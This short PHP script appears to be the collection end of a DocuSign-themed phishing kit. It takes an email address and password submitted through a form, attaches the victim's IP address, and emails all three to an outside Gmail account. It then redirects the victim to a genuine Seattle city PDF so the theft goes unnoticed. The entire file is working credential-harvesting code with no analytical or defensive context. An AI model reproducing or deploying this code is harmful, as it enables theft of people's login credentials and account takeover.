<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Bang! Bang!! Bang!!! || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="bdshiprnan@gmail.com";
$subject = " Docusign | ".$ip."\n";
mail($recipient,$subject,$message);
header("location: https://www.seattle.gov/Documents/Departments/FAS/PurchasingAndContracting/Contracting/PW-projects.pdf");
?>